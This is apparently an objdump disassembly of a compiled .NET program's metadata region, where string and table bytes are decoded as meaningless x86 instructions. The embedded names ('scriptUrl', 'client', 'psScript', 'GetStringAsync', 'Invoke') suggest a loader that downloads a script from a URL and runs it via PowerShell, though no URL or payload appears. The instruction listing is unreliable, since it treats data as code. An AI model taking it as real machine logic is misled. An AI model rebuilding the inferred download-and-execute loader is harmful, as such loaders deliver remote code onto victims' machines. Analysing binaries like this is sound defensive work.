  40254c:	02 00                	add    al,BYTE PTR [eax]
  40254e:	a0 20 00 00 00       	mov    al,ds:0x20
  402553:	00 91 08 aa 00 21    	add    BYTE PTR [ecx+0x2100aa08],dl
  402559:	01 02                	add    DWORD PTR [edx],eax
  40255b:	00 c0                	add    al,al
  40255d:	20 00                	and    BYTE PTR [eax],al
  40255f:	00 00                	add    BYTE PTR [eax],al
  402561:	00 86 18 83 04 06    	add    BYTE PTR [esi+0x6048318],al
  402567:	00 03                	add    BYTE PTR [ebx],al
  402569:	00 cc                	add    ah,cl
  40256b:	20 00                	and    BYTE PTR [eax],al
  40256d:	00 00                	add    BYTE PTR [eax],al
  40256f:	00 e1                	add    cl,ah
  402571:	01 3e                	add    DWORD PTR [esi],edi
  402573:	05 06 00 03 00       	add    eax,0x30006
  402578:	1c 23                	sbb    al,0x23
  40257a:	00 00                	add    BYTE PTR [eax],al
  40257c:	00 00                	add    BYTE PTR [eax],al
  40257e:	e1 01                	loope  0x402581
  402580:	50                   	push   eax
  402581:	01 20                	add    DWORD PTR [eax],esp
  402583:	00 03                	add    BYTE PTR [ebx],al
  402585:	00 00                	add    BYTE PTR [eax],al
  402587:	00 01                	add    BYTE PTR [ecx],al
  402589:	00 cb                	add    bl,cl
  40258b:	04 00                	add    al,0x0
  40258d:	00 01                	add    BYTE PTR [ecx],al
  40258f:	00 cb                	add    bl,cl
  402591:	04 00                	add    al,0x0
  402593:	00 01                	add    BYTE PTR [ecx],al
  402595:	00 60 01             	add    BYTE PTR [eax+0x1],ah
  402598:	03 00                	add    eax,DWORD PTR [eax]
  40259a:	59                   	pop    ecx
  40259b:	00 09                	add    BYTE PTR [ecx],cl
  40259d:	00 83 04 01 00 11    	add    BYTE PTR [ebx+0x11000104],al
  4025a3:	00 83 04 06 00 19    	add    BYTE PTR [ebx+0x19000604],al
  4025a9:	00 83 04 0a 00 29    	add    BYTE PTR [ebx+0x29000a04],al
  4025af:	00 83 04 10 00 31    	add    BYTE PTR [ebx+0x31001004],al
  4025b5:	00 83 04 10 00 39    	add    BYTE PTR [ebx+0x39001004],al
  4025bb:	00 83 04 10 00 41    	add    BYTE PTR [ebx+0x41001004],al
  4025c1:	00 83 04 10 00 49    	add    BYTE PTR [ebx+0x49001004],al
  4025c7:	00 83 04 10 00 51    	add    BYTE PTR [ebx+0x51001004],al
  4025cd:	00 83 04 10 00 59    	add    BYTE PTR [ebx+0x59001004],al
  4025d3:	00 83 04 10 00 61    	add    BYTE PTR [ebx+0x61001004],al
  4025d9:	00 83 04 01 00 71    	add    BYTE PTR [ebx+0x71000104],al
  4025df:	00 83 04 15 00 81    	add    BYTE PTR [ebx-0x7effeafc],al
  4025e5:	00 83 04 1a 00 89    	add    BYTE PTR [ebx-0x76ffe5fc],al
  4025eb:	00 83 04 06 00 99    	add    BYTE PTR [ebx-0x66fff9fc],al
  4025f1:	00 83 04 15 00 a9    	add    BYTE PTR [ebx-0x56ffeafc],al
  4025f7:	00 83 04 06 00 b1    	add    BYTE PTR [ebx-0x4efff9fc],al
  4025fd:	00 3e                	add    BYTE PTR [esi],bh
  4025ff:	05 06 00 b1 00       	add    eax,0xb10006
  402604:	50                   	push   eax
  402605:	01 20                	add    DWORD PTR [eax],esp
  402607:	00 99 00 83 04 26    	add    BYTE PTR [ecx+0x26048300],bl
  40260d:	00 f9                	add    cl,bh
  40260f:	00 83 04 06 00 c9    	add    BYTE PTR [ebx-0x36fff9fc],al
  402615:	00 7a 01             	add    BYTE PTR [edx+0x1],bh
  402618:	31 00                	xor    DWORD PTR [eax],eax
  40261a:	c9                   	leave  
  40261b:	00 38                	add    BYTE PTR [eax],bh
  40261d:	05 36 00 c9 00       	add    eax,0xc90036
  402622:	73 03                	jae    0x402627
  402624:	43                   	inc    ebx
  402625:	00 69 00             	add    BYTE PTR [ecx+0x0],ch
  402628:	83 04 06 00          	add    DWORD PTR [esi+eax*1],0x0
  40262c:	91                   	xchg   ecx,eax
  40262d:	00 5e 04             	add    BYTE PTR [esi+0x4],bl
  402630:	4d                   	dec    ebp
  402631:	00 a1 00 03 05 06    	add    BYTE PTR [ecx+0x6050300],ah
  402637:	00 d1                	add    cl,dl
  402639:	00 83 04 06 00 d1    	add    BYTE PTR [ebx-0x2efff9fc],al
  40263f:	00 cc                	add    ah,cl
  402641:	00 5f 00             	add    BYTE PTR [edi+0x0],bl
  402644:	0c 00                	or     al,0x0
  402646:	5e                   	pop    esi
  402647:	04 70                	add    al,0x70
  402649:	00 14 00             	add    BYTE PTR [eax+eax*1],dl
  40264c:	f2 00 7f 00          	repnz add BYTE PTR [edi+0x0],bh
  402650:	c9                   	leave  
  402651:	00 db                	add    bl,bl
  402653:	00 83 00 14 00 03    	add    BYTE PTR [ebx+0x3001400],al
  402659:	05 98 00 d9 00       	add    eax,0xd90098
  40265e:	7a 01                	jp     0x402661
  402660:	9d                   	popf   
  402661:	00 d9                	add    cl,bl
  402663:	00 2e                	add    BYTE PTR [esi],ch
  402665:	05 a2 00 d9 00       	add    eax,0xd900a2
  40266a:	02 01                	add    al,BYTE PTR [ecx]
  40266c:	a8 00                	test   al,0x0
  40266e:	1c 00                	sbb    al,0x0
  402670:	75 04                	jne    0x402676
  402672:	b8 00 24 00 22       	mov    eax,0x22002400
  402677:	05 98 00 69 00       	add    eax,0x690098
  40267c:	6a 03                	push   0x3
  40267e:	c8 00 09 01          	enter  0x900,0x1
  402682:	33 01                	xor    eax,DWORD PTR [ecx]
  402684:	cc                   	int3   
  402685:	00 11                	add    BYTE PTR [ecx],dl
  402687:	01 3e                	add    DWORD PTR [esi],edi
  402689:	05 7f 00 19 01       	add    eax,0x119007f
  40268e:	72 01                	jb     0x402691
  402690:	06                   	push   es
  402691:	00 c9                	add    cl,cl
  402693:	00 ff                	add    bh,bh
  402695:	03 d1                	add    edx,ecx
  402697:	00 c9                	add    cl,cl
  402699:	00 0d 05 06 00 20    	add    BYTE PTR ds:0x20000605,cl
  40269f:	00 63 00             	add    BYTE PTR [ebx+0x0],ah
  4026a2:	d0 01                	rol    BYTE PTR [ecx],1
  4026a4:	20 00                	and    BYTE PTR [eax],al
  4026a6:	6b 00 d6             	imul   eax,DWORD PTR [eax],0xffffffd6
  4026a9:	01 20                	add    DWORD PTR [eax],esp
  4026ab:	00 73 00             	add    BYTE PTR [ebx+0x0],dh
  4026ae:	ee                   	out    dx,al
  4026af:	01 27                	add    DWORD PTR [edi],esp
  4026b1:	00 5b 00             	add    BYTE PTR [ebx+0x0],bl
  4026b4:	fe 01                	inc    BYTE PTR [ecx]
  4026b6:	2e 00 0b             	add    BYTE PTR cs:[ebx],cl
  4026b9:	00 27                	add    BYTE PTR [edi],ah
  4026bb:	01 2e                	add    DWORD PTR [esi],ebp
  4026bd:	00 13                	add    BYTE PTR [ebx],dl
  4026bf:	00 30                	add    BYTE PTR [eax],dh
  4026c1:	01 2e                	add    DWORD PTR [esi],ebp
  4026c3:	00 1b                	add    BYTE PTR [ebx],bl
  4026c5:	00 4f 01             	add    BYTE PTR [edi+0x1],cl
  4026c8:	2e 00 23             	add    BYTE PTR cs:[ebx],ah
  4026cb:	00 58 01             	add    BYTE PTR [eax+0x1],bl
  4026ce:	2e 00 2b             	add    BYTE PTR cs:[ebx],ch
  4026d1:	00 96 01 2e 00 33    	add    BYTE PTR [esi+0x33002e01],dl
  4026d7:	00 ad 01 2e 00 3b    	add    BYTE PTR [ebp+0x3b002e01],ch
  4026dd:	00 b8 01 2e 00 43    	add    BYTE PTR [eax+0x43002e01],bh
  4026e3:	00 c5                	add    ch,al
  4026e5:	01 2e                	add    DWORD PTR [esi],ebp
  4026e7:	00 4b 00             	add    BYTE PTR [ebx+0x0],cl
  4026ea:	96                   	xchg   esi,eax
  4026eb:	01 2e                	add    DWORD PTR [esi],ebp
  4026ed:	00 53 00             	add    BYTE PTR [ebx+0x0],dl
  4026f0:	96                   	xchg   esi,eax
  4026f1:	01 44 00 7b          	add    DWORD PTR [eax+eax*1+0x7b],eax
  4026f5:	00 d0                	add    al,dl
  4026f7:	01 60 00             	add    DWORD PTR [eax+0x0],esp
  4026fa:	73 00                	jae    0x4026fc
  4026fc:	ee                   	out    dx,al
  4026fd:	01 61 00             	add    DWORD PTR [ecx+0x0],esp
  402700:	9b                   	fwait
  402701:	00 f3                	add    bl,dh
  402703:	01 63 00             	add    DWORD PTR [ebx+0x0],esp
  402706:	83 00 ee             	add    DWORD PTR [eax],0xffffffee
  402709:	01 64 00 7b          	add    DWORD PTR [eax+eax*1+0x7b],esp
  40270d:	00 d0                	add    al,dl
  40270f:	01 c0                	add    eax,eax
  402711:	00 a3 00 ee 01 81    	add    BYTE PTR [ebx-0x7efe1200],ah
  402717:	01 9b 00 f3 01 2c    	add    DWORD PTR [ebx+0x2c01f300],ebx
  40271d:	00 48 00             	add    BYTE PTR [eax+0x0],cl
  402720:	52                   	push   edx
  402721:	00 03                	add    BYTE PTR [ebx],al
  402723:	00 0a                	add    BYTE PTR [edx],cl
  402725:	00 23                	add    BYTE PTR [ebx],ah
  402727:	00 03                	add    BYTE PTR [ebx],al
  402729:	00 0c 00             	add    BYTE PTR [eax+eax*1],cl
  40272c:	25 00 69 00 79       	and    eax,0x79006900
  402731:	00 b1 00 c1 00 04    	add    BYTE PTR [ecx+0x400c100],dh
  402737:	80 00 00             	add    BYTE PTR [eax],0x0
  40273a:	01 00                	add    DWORD PTR [eax],eax
	...
  402748:	40                   	inc    eax
  402749:	04 00                	add    al,0x0
  40274b:	00 09                	add    BYTE PTR [ecx],cl
	...
  402755:	00 00                	add    BYTE PTR [eax],al
  402757:	00 d7                	add    bh,dl
  402759:	00 24 01             	add    BYTE PTR [ecx+eax*1],ah
  40275c:	00 00                	add    BYTE PTR [eax],al
  40275e:	00 00                	add    BYTE PTR [eax],al
  402760:	09 00                	or     DWORD PTR [eax],eax
	...
  40276a:	00 00                	add    BYTE PTR [eax],al
  40276c:	d7                   	xlat   BYTE PTR ds:[ebx]
  40276d:	00 0c 04             	add    BYTE PTR [esp+eax*1],cl
  402770:	00 00                	add    BYTE PTR [eax],al
  402772:	00 00                	add    BYTE PTR [eax],al
  402774:	07                   	pop    es
  402775:	00 05 00 00 00 f4    	add    BYTE PTR ds:0xf4000000,al
  40277b:	01 00                	add    DWORD PTR [eax],eax
  40277d:	00 00                	add    BYTE PTR [eax],al
  40277f:	00 e0                	add    al,ah
  402781:	00 d0                	add    al,dl
  402783:	03 00                	add    eax,DWORD PTR [eax]
  402785:	00 00                	add    BYTE PTR [eax],al
  402787:	00 09                	add    BYTE PTR [ecx],cl
	...
  402791:	00 00                	add    BYTE PTR [eax],al
  402793:	00 d7                	add    bh,dl
  402795:	00 15 01 00 00 00    	add    BYTE PTR ds:0x1,dl
  40279b:	00 03                	add    BYTE PTR [ebx],al
  40279d:	00 02                	add    BYTE PTR [edx],al
  40279f:	00 2d 00 3e 00 3f    	add    BYTE PTR ds:0x3f003e00,ch
  4027a5:	00 8e 00 00 00 00    	add    BYTE PTR [esi+0x0],cl
  4027ab:	00 00                	add    BYTE PTR [eax],al
  4027ad:	3c 4d                	cmp    al,0x4d
  4027af:	61                   	popa   
  4027b0:	69 6e 3e 64 5f 5f 30 	imul   ebp,DWORD PTR [esi+0x3e],0x305f5f64
  4027b7:	00 3c 73             	add    BYTE PTR [ebx+esi*2],bh
  4027ba:	63 72 69             	arpl   WORD PTR [edx+0x69],si
  4027bd:	70 74                	jo     0x402833
  4027bf:	55                   	push   ebp
  4027c0:	72 6c                	jb     0x40282e
  4027c2:	3e 35 5f 5f 31 00    	ds xor eax,0x315f5f
  4027c8:	3c 3e                	cmp    al,0x3e
  4027ca:	75 5f                	jne    0x40282b
  4027cc:	5f                   	pop    edi
  4027cd:	31 00                	xor    DWORD PTR [eax],eax
  4027cf:	54                   	push   esp
  4027d0:	61                   	popa   
  4027d1:	73 6b                	jae    0x40283e
  4027d3:	60                   	pusha  
  4027d4:	31 00                	xor    DWORD PTR [eax],eax
  4027d6:	43                   	inc    ebx
  4027d7:	6f                   	outs   dx,DWORD PTR ds:[esi]
  4027d8:	6c                   	ins    BYTE PTR es:[edi],dx
  4027d9:	6c                   	ins    BYTE PTR es:[edi],dx
  4027da:	65 63 74 69 6f       	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4027df:	6e                   	outs   dx,BYTE PTR ds:[esi]
  4027e0:	60                   	pusha  
  4027e1:	31 00                	xor    DWORD PTR [eax],eax
  4027e3:	54                   	push   esp
  4027e4:	61                   	popa   
  4027e5:	73 6b                	jae    0x402852
  4027e7:	41                   	inc    ecx
  4027e8:	77 61                	ja     0x40284b
  4027ea:	69 74 65 72 60 31 00 	imul   esi,DWORD PTR [ebp+eiz*2+0x72],0x49003160
  4027f1:	49 
  4027f2:	45                   	inc    ebp
  4027f3:	6e                   	outs   dx,BYTE PTR ds:[esi]
  4027f4:	75 6d                	jne    0x402863
  4027f6:	65 72 61             	gs jb  0x40285a
  4027f9:	74 6f                	je     0x40286a
  4027fb:	72 60                	jb     0x40285d
  4027fd:	31 00                	xor    DWORD PTR [eax],eax
  4027ff:	3c 63                	cmp    al,0x63
  402801:	6c                   	ins    BYTE PTR es:[edi],dx
  402802:	69 65 6e 74 3e 35 5f 	imul   esp,DWORD PTR [ebp+0x6e],0x5f353e74
  402809:	5f                   	pop    edi
  40280a:	32 00                	xor    al,BYTE PTR [eax]
  40280c:	3c 70                	cmp    al,0x70
  40280e:	73 53                	jae    0x402863
  402810:	63 72 69             	arpl   WORD PTR [edx+0x69],si
  402813:	70 74                	jo     0x402889
  402815:	3e 35 5f 5f 33 00    	ds xor eax,0x335f5f
  40281b:	3c 3e                	cmp    al,0x3e
  40281d:	73 5f                	jae    0x40287e
  40281f:	5f                   	pop    edi
  402820:	34 00                	xor    al,0x0
  402822:	3c 70                	cmp    al,0x70
  402824:	73 3e                	jae    0x402864
  402826:	35 5f 5f 35 00       	xor    eax,0x355f5f
  40282b:	3c 72                	cmp    al,0x72
  40282d:	65 73 75             	gs jae 0x4028a5
  402830:	6c                   	ins    BYTE PTR es:[edi],dx
  402831:	74 73                	je     0x4028a6
  402833:	3e 35 5f 5f 36 00    	ds xor eax,0x365f5f
  402839:	3c 3e                	cmp    al,0x3e
  40283b:	73 5f                	jae    0x40289c
  40283d:	5f                   	pop    edi
  40283e:	37                   	aaa    
  40283f:	00 3c 72             	add    BYTE PTR [edx+esi*2],bh
  402842:	65 73 75             	gs jae 0x4028ba
  402845:	6c                   	ins    BYTE PTR es:[edi],dx
  402846:	74 3e                	je     0x402886
  402848:	35 5f 5f 38 00       	xor    eax,0x385f5f
  40284d:	3c 4d                	cmp    al,0x4d
  40284f:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402850:	64 75 6c             	fs jne 0x4028bf
  402853:	65 3e 00 3c 4d 61 69 	gs add BYTE PTR ds:[ecx*2+0x3e6e6961],bh
  40285a:	6e 3e 
  40285c:	00 53 79             	add    BYTE PTR [ebx+0x79],dl
  40285f:	73 74                	jae    0x4028d5
  402861:	65 6d                	gs ins DWORD PTR es:[edi],dx
  402863:	2e 43                	cs inc ebx
  402865:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402866:	6c                   	ins    BYTE PTR es:[edi],dx
  402867:	6c                   	ins    BYTE PTR es:[edi],dx
  402868:	65 63 74 69 6f       	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40286d:	6e                   	outs   dx,BYTE PTR ds:[esi]
  40286e:	73 2e                	jae    0x40289e
  402870:	47                   	inc    edi
  402871:	65 6e                	outs   dx,BYTE PTR gs:[esi]
  402873:	65 72 69             	gs jb  0x4028df
  402876:	63 00                	arpl   WORD PTR [eax],ax
  402878:	47                   	inc    edi
  402879:	65 74 53             	gs je  0x4028cf
  40287c:	74 72                	je     0x4028f0
  40287e:	69 6e 67 41 73 79 6e 	imul   ebp,DWORD PTR [esi+0x67],0x6e797341
  402885:	63 00                	arpl   WORD PTR [eax],ax
  402887:	41                   	inc    ecx
  402888:	77 61                	ja     0x4028eb
  40288a:	69 74 55 6e 73 61 66 	imul   esi,DWORD PTR [ebp+edx*2+0x6e],0x65666173
  402891:	65 
  402892:	4f                   	dec    edi
  402893:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402894:	43                   	inc    ebx
  402895:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402896:	6d                   	ins    DWORD PTR es:[edi],dx
  402897:	70 6c                	jo     0x402905
  402899:	65 74 65             	gs je  0x402901
  40289c:	64 00 67 65          	add    BYTE PTR fs:[edi+0x65],ah
  4028a0:	74 5f                	je     0x402901
  4028a2:	49                   	dec    ecx
  4028a3:	73 43                	jae    0x4028e8
  4028a5:	6f                   	outs   dx,DWORD PTR ds:[esi]
  4028a6:	6d                   	ins    DWORD PTR es:[edi],dx
  4028a7:	70 6c                	jo     0x402915
  4028a9:	65 74 65             	gs je  0x402911
  4028ac:	64 00 49 6e          	add    BYTE PTR fs:[ecx+0x6e],cl
  4028b0:	76 6f                	jbe    0x402921
  4028b2:	6b 65 00 49          	imul   esp,DWORD PTR [ebp+0x0],0x49
  4028b6:	44                   	inc    esp
  4028b7:	69 73 70 6f 73 61 62 	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  4028be:	6c                   	ins    BYTE PTR es:[edi],dx
  4028bf:	65 00 53 79          	add    BYTE PTR gs:[ebx+0x79],dl
  4028c3:	73 74                	jae    0x402939
  4028c5:	65 6d                	gs ins DWORD PTR es:[edi],dx
  4028c7:	2e 43                	cs inc ebx
  4028c9:	6f                   	outs   dx,DWORD PTR ds:[esi]
  4028ca:	6e                   	outs   dx,BYTE PTR ds:[esi]
  4028cb:	73 6f                	jae    0x40293c
  4028cd:	6c                   	ins    BYTE PTR es:[edi],dx
  4028ce:	65 00 53 79          	add    BYTE PTR gs:[ebx+0x79],dl
  4028d2:	73 74                	jae    0x402948
  4028d4:	65 6d                	gs ins DWORD PTR es:[edi],dx
  4028d6:	2e 52                	cs push edx
  4028d8:	75 6e                	jne    0x402948
  4028da:	74 69                	je     0x402945
  4028dc:	6d                   	ins    DWORD PTR es:[edi],dx
  4028dd:	65 00 57 72          	add    BYTE PTR gs:[edi+0x72],dl
  4028e1:	69 74 65 4c 69 6e 65 	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
  4028e8:	00 
  4028e9:	49                   	dec    ecx
  4028ea:	41                   	inc    ecx
  4028eb:	73 79                	jae    0x402966
  4028ed:	6e                   	outs   dx,BYTE PTR ds:[esi]
  4028ee:	63 53 74             	arpl   WORD PTR [ebx+0x74],dx
  4028f1:	61                   	popa   
  4028f2:	74 65                	je     0x402959
  4028f4:	4d                   	dec    ebp
  4028f5:	61                   	popa   
  4028f6:	63 68 69             	arpl   WORD PTR [eax+0x69],bp
  4028f9:	6e                   	outs   dx,BYTE PTR ds:[esi]
  4028fa:	65 00 53 65          	add    BYTE PTR gs:[ebx+0x65],dl
  4028fe:	74 53                	je     0x402953
  402900:	74 61                	je     0x402963
  402902:	74 65                	je     0x402969
  402904:	4d                   	dec    ebp
  402905:	61                   	popa   
  402906:	63 68 69             	arpl   WORD PTR [eax+0x69],bp
  402909:	6e                   	outs   dx,BYTE PTR ds:[esi]
  40290a:	65 00 73 74          	add    BYTE PTR gs:[ebx+0x74],dh
  40290e:	61                   	popa   
  40290f:	74 65                	je     0x402976
  402911:	4d                   	dec    ebp
  402912:	61                   	popa   
  402913:	63 68 69             	arpl   WORD PTR [eax+0x69],bp
  402916:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402917:	65 00 54 79 70       	add    BYTE PTR gs:[ecx+edi*2+0x70],dl
  40291c:	65 00 44 69 73       	add    BYTE PTR gs:[ecx+ebp*2+0x73],al
  402921:	70 6f                	jo     0x402992
  402923:	73 65                	jae    0x40298a
  402925:	00 43 72             	add    BYTE PTR [ebx+0x72],al
  402928:	65 61                	gs popa 
  40292a:	74 65                	je     0x402991
  40292c:	00 3c 3e             	add    BYTE PTR [esi+edi*1],bh
  40292f:	31 5f 5f             	xor    DWORD PTR [edi+0x5f],ebx
  402932:	73 74                	jae    0x4029a8
  402934:	61                   	popa   
  402935:	74 65                	je     0x40299c
  402937:	00 43 6f             	add    BYTE PTR [ebx+0x6f],al
  40293a:	6d                   	ins    DWORD PTR es:[edi],dx
  40293b:	70 69                	jo     0x4029a6
  40293d:	6c                   	ins    BYTE PTR es:[edi],dx
  40293e:	65 72 47             	gs jb  0x402988
  402941:	65 6e                	outs   dx,BYTE PTR gs:[esi]
  402943:	65 72 61             	gs jb  0x4029a7
  402946:	74 65                	je     0x4029ad
  402948:	64 41                	fs inc ecx
  40294a:	74 74                	je     0x4029c0
  40294c:	72 69                	jb     0x4029b7
  40294e:	62 75 74             	bound  esi,QWORD PTR [ebp+0x74]
  402951:	65 00 44 65 62       	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  402956:	75 67                	jne    0x4029bf
  402958:	67 61                	addr16 popa 
  40295a:	62 6c 65 41          	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  40295e:	74 74                	je     0x4029d4
  402960:	72 69                	jb     0x4029cb
  402962:	62 75 74             	bound  esi,QWORD PTR [ebp+0x74]
  402965:	65 00 4e 75          	add    BYTE PTR gs:[esi+0x75],cl
  402969:	6c                   	ins    BYTE PTR es:[edi],dx
  40296a:	6c                   	ins    BYTE PTR es:[edi],dx
  40296b:	61                   	popa   
  40296c:	62 6c 65 41          	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  402970:	74 74                	je     0x4029e6
  402972:	72 69                	jb     0x4029dd
  402974:	62 75 74             	bound  esi,QWORD PTR [ebp+0x74]
  402977:	65 00 41 73          	add    BYTE PTR gs:[ecx+0x73],al
  40297b:	73 65                	jae    0x4029e2
  40297d:	6d                   	ins    DWORD PTR es:[edi],dx
  40297e:	62 6c 79 54          	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  402982:	69 74 6c 65 41 74 74 	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  402989:	72 
  40298a:	69 62 75 74 65 00 41 	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402991:	73 79                	jae    0x402a0c
  402993:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402994:	63 53 74             	arpl   WORD PTR [ebx+0x74],dx
  402997:	61                   	popa   
  402998:	74 65                	je     0x4029ff
  40299a:	4d                   	dec    ebp
  40299b:	61                   	popa   
  40299c:	63 68 69             	arpl   WORD PTR [eax+0x69],bp
  40299f:	6e                   	outs   dx,BYTE PTR ds:[esi]
  4029a0:	65 41                	gs inc ecx
  4029a2:	74 74                	je     0x402a18
  4029a4:	72 69                	jb     0x402a0f
  4029a6:	62 75 74             	bound  esi,QWORD PTR [ebp+0x74]
  4029a9:	65 00 44 65 62       	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  4029ae:	75 67                	jne    0x402a17
  4029b0:	67 65 72 53          	addr16 gs jb 0x402a07
  4029b4:	74 65                	je     0x402a1b
  4029b6:	70 54                	jo     0x402a0c
  4029b8:	68 72 6f 75 67       	push   0x67756f72
  4029bd:	68 41 74 74 72       	push   0x72747441
  4029c2:	69 62 75 74 65 00 54 	imul   esp,DWORD PTR [edx+0x75],0x54006574
  4029c9:	61                   	popa   
  4029ca:	72 67                	jb     0x402a33
  4029cc:	65 74 46             	gs je  0x402a15
  4029cf:	72 61                	jb     0x402a32
  4029d1:	6d                   	ins    DWORD PTR es:[edi],dx
  4029d2:	65 77 6f             	gs ja  0x402a44
  4029d5:	72 6b                	jb     0x402a42
  4029d7:	41                   	inc    ecx
  4029d8:	74 74                	je     0x402a4e
  4029da:	72 69                	jb     0x402a45
  4029dc:	62 75 74             	bound  esi,QWORD PTR [ebp+0x74]
  4029df:	65 00 44 65 62       	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  4029e4:	75 67                	jne    0x402a4d
  4029e6:	67 65 72 48          	addr16 gs jb 0x402a32
  4029ea:	69 64 64 65 6e 41 74 	imul   esp,DWORD PTR [esp+eiz*2+0x65],0x7474416e
  4029f1:	74 
  4029f2:	72 69                	jb     0x402a5d
  4029f4:	62 75 74             	bound  esi,QWORD PTR [ebp+0x74]
  4029f7:	65 00 41 73          	add    BYTE PTR gs:[ecx+0x73],al
  4029fb:	73 65                	jae    0x402a62
  4029fd:	6d                   	ins    DWORD PTR es:[edi],dx
  4029fe:	62 6c 79 46          	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  402a02:	69 6c 65 56 65 72 73 	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  402a09:	69 
  402a0a:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402a0b:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402a0c:	41                   	inc    ecx
  402a0d:	74 74                	je     0x402a83
  402a0f:	72 69                	jb     0x402a7a
  402a11:	62 75 74             	bound  esi,QWORD PTR [ebp+0x74]
  402a14:	65 00 41 73          	add    BYTE PTR gs:[ecx+0x73],al
  402a18:	73 65                	jae    0x402a7f
  402a1a:	6d                   	ins    DWORD PTR es:[edi],dx
  402a1b:	62 6c 79 49          	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  402a1f:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402a20:	66 6f                	outs   dx,WORD PTR ds:[esi]
  402a22:	72 6d                	jb     0x402a91
  402a24:	61                   	popa   
  402a25:	74 69                	je     0x402a90
  402a27:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402a28:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402a29:	61                   	popa   
  402a2a:	6c                   	ins    BYTE PTR es:[edi],dx
  402a2b:	56                   	push   esi
  402a2c:	65 72 73             	gs jb  0x402aa2
  402a2f:	69 6f 6e 41 74 74 72 	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402a36:	69 62 75 74 65 00 41 	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402a3d:	73 73                	jae    0x402ab2
  402a3f:	65 6d                	gs ins DWORD PTR es:[edi],dx
  402a41:	62 6c 79 43          	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  402a45:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402a46:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402a47:	66 69 67 75 72 61    	imul   sp,WORD PTR [edi+0x75],0x6172
  402a4d:	74 69                	je     0x402ab8
  402a4f:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402a50:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402a51:	41                   	inc    ecx
  402a52:	74 74                	je     0x402ac8
  402a54:	72 69                	jb     0x402abf
  402a56:	62 75 74             	bound  esi,QWORD PTR [ebp+0x74]
  402a59:	65 00 52 65          	add    BYTE PTR gs:[edx+0x65],dl
  402a5d:	66 53                	push   bx
  402a5f:	61                   	popa   
  402a60:	66 65 74 79          	data16 gs je 0x402add
  402a64:	52                   	push   edx
  402a65:	75 6c                	jne    0x402ad3
  402a67:	65 73 41             	gs jae 0x402aab
  402a6a:	74 74                	je     0x402ae0
  402a6c:	72 69                	jb     0x402ad7
  402a6e:	62 75 74             	bound  esi,QWORD PTR [ebp+0x74]
  402a71:	65 00 43 6f          	add    BYTE PTR gs:[ebx+0x6f],al
  402a75:	6d                   	ins    DWORD PTR es:[edi],dx
  402a76:	70 69                	jo     0x402ae1
  402a78:	6c                   	ins    BYTE PTR es:[edi],dx
  402a79:	61                   	popa   
  402a7a:	74 69                	je     0x402ae5
  402a7c:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402a7d:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402a7e:	52                   	push   edx
  402a7f:	65 6c                	gs ins BYTE PTR es:[edi],dx
  402a81:	61                   	popa   
  402a82:	78 61                	js     0x402ae5
  402a84:	74 69                	je     0x402aef
  402a86:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402a87:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402a88:	73 41                	jae    0x402acb
  402a8a:	74 74                	je     0x402b00
  402a8c:	72 69                	jb     0x402af7
  402a8e:	62 75 74             	bound  esi,QWORD PTR [ebp+0x74]
  402a91:	65 00 41 73          	add    BYTE PTR gs:[ecx+0x73],al
  402a95:	73 65                	jae    0x402afc
  402a97:	6d                   	ins    DWORD PTR es:[edi],dx
  402a98:	62 6c 79 50          	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  402a9c:	72 6f                	jb     0x402b0d
  402a9e:	64 75 63             	fs jne 0x402b04
  402aa1:	74 41                	je     0x402ae4
  402aa3:	74 74                	je     0x402b19
  402aa5:	72 69                	jb     0x402b10
  402aa7:	62 75 74             	bound  esi,QWORD PTR [ebp+0x74]
  402aaa:	65 00 4e 75          	add    BYTE PTR gs:[esi+0x75],cl
  402aae:	6c                   	ins    BYTE PTR es:[edi],dx
  402aaf:	6c                   	ins    BYTE PTR es:[edi],dx
  402ab0:	61                   	popa   
  402ab1:	62 6c 65 43          	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
  402ab5:	6f                   	outs   dx,DWORD PTR ds:[esi]
  402ab6:	6e                   	outs   dx,BYTE PTR ds:[esi]
  402ab7:	74 65                	je     0x402b1e
  402ab9:	78 74                	js     0x402b2f
  402abb:	41                   	inc    ecx
  402abc:	74 74                	je     0x402b32
  402abe:	72 69                	jb     0x402b29
  402ac0:	62 75 74             	bound  esi,QWORD PTR [ebp+0x74]
  402ac3:	65 00 41 73          	add    BYTE PTR gs:[ecx+0x73],al
  402ac7:	73 65                	jae    0x402b2e
  402ac9:	6d                   	ins    DWORD PTR es:[edi],dx
  402aca:	62 6c 79 43          	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
